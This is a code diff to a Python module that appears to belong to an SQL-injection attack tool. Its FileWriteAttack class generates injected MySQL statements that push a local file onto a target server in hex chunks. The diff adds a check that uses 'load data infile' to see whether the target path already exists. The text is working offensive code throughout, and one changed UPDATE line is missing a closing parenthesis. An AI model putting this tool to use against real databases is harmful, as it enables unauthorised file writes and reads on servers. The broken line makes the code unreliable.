@@ -3,6 +3,7 @@ import binascii
 import base64
 import random
 import string
+import re
 
 from .attack import Attack, AttackException
 
@@ -19,9 +20,16 @@ class FileWriteAttack(Attack):
     def __init__(self, conf_entry):
         super(FileWriteAttack, self).__init__(conf_entry)
 
+        # Used to check for file existance. This code will be in the returned
+        # page at some point if we're testing for file existence. 
+        # (Set before calling _filewrite_sequence() as that has the side effect of setting
+        # it to some value.
+        self._fileexist_code = None
+
         # prebuild the sql sequence. This may be better done one at a time so as to not
         # read the whole file into memory. GTL fix this.
         self.sqls = self._filewrite_sequence()
+
 
     def _confirm_config(self):
         '''Make sure the config has what we need for the file write attack.'''
@@ -73,13 +81,15 @@ class FileWriteAttack(Attack):
                     else:
                         data = binascii.b2a_hex(chunk).decode()
 
-                    statements.append('UPDATE {} SET data = data || \'{}\''.format(table, data))
+                    statements.append('UPDATE {} SET data = concat(data,\'{}\''.format(table, data))
 
         return table, statements
 
     def _filewrite_seq_mysql(self, pathfrom, pathto):
         # write file to a table
+        file_exist_statements = self._check_file_exist(pathto)
         table, statements = self._write_filedata(pathfrom, datatype='LONGBLOB', enc64=False)
+        statements = file_exist_statements + statements
 
         # now read it out of the database and into a file.
         # (We would use base64 here, but mysql 5.0 does not support native base64 decoding.)
@@ -118,5 +128,36 @@ class FileWriteAttack(Attack):
 
         return statements
 
-    def handle_response(self):
+    def handle_response(self, response, url):
+        '''Handle responses to our SQL statements.'''
         log.info('Got response.')
+        if self._fileexist_code:
+            # Check for a file exist code in the returned page, if there check the value.
+            # a non-zero return means the file does exist else it does not or we do not
+            # have read/write access to it.
+            m = re.search('{}=(\d+)'.format(self._fileexist_code), response, flags=re.DOTALL)
+            if m:
+                char_count = m.groups(1)[0]
+                log.debug('Found response --> {}'.format(char_count))
+                if 0 < int(char_count):
+                    log.warning('File we are trying to overwrite already exists.')
+                    return 1, ('File already exists - the attack will fail as MYSQL does not '
+                                'overwrite an existing file. Remove the file or use a different '
+                                'path.')
+
+        return 0, ''
+
+    def _check_file_exist(self, remotepath):
+        '''Add a few SQL statements taht will check for the existance of a file. The statements
+        will be injected and the response must be checked for in handle_response().'''
+        table = ''.join(random.choice(string.ascii_uppercase) for _ in range(16))
+        self._fileexist_code = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+        statements = []
+        statements.append('CREATE TABLE {} (data blob)'.format(table))
+        statements.append('load data infile "{}" into table {}'.format(remotepath, table))
+        # Now we check the number of lines written to the table. If 0, the file does not
+        # exist or we do not have permission to read/wrote it anyway...
+        statements.append('SELECT CONCAT(\'{}=\', count(*)) from {}'.format(
+            self._fileexist_code, table))
+        statements.append('DROP TABLE {}'.format(table))
+        return statements
